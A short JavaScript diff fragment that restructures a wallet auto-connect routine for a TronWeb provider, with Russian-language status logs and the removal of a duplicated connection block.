+    if(!TW.tronWeb){TW.p=p;TW.tronWeb=p.tronWeb;}
+    if(!TW.address){
+      const ok=await waitAccounts(p);
+      if(!ok){setStatus("provider silent","err");log("адрес не получен","err");return;}
+      setAddress(p.tronWeb.defaultAddress.base58);
+      log("автоподключение завершено","ok");
     }
-    log("провайдер найден","ok");
-    TW.p=p;TW.tronWeb=p.tronWeb;
-    const ok=await waitAccounts(p);
-    if(!ok){setStatus("provider silent","err");log("адрес не получен","err");return;}
-    setAddress(p.tronWeb.defaultAddress.base58);
-    log("автоподключение завершено","ok");
-    await tgDiscover();
     await pipeline();
   }finally{BOOT_RUN=false;}
 }
